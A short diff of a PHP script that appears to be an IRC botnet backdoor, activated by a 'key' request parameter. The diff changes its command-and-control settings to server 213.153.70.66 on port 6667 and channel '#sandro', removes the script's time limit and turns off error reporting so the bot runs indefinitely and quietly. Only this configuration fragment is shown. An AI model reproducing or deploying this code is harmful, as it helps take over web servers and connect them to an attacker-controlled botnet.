@@ -1,16 +1,16 @@
 <?php
-set_time_limit(10);
-error_reporting(1);
+set_time_limit(0);
+error_reporting(0);
 
 if(isset($_GET['key']) == "doom") {
     class sell {
         var $config = array(
-					'server' => '213.153.68.5',
+					'server' => '213.153.70.66',
 					'port' => '6667',
 					"key" => '',
 					'prefix' => 'Linux',
 					'maxrand' => '5',
-					'chan' => '#end',
+					'chan' => '#sandro',
 					'trigger' => '.',
 					'password' => '',
 					'auth' => ''
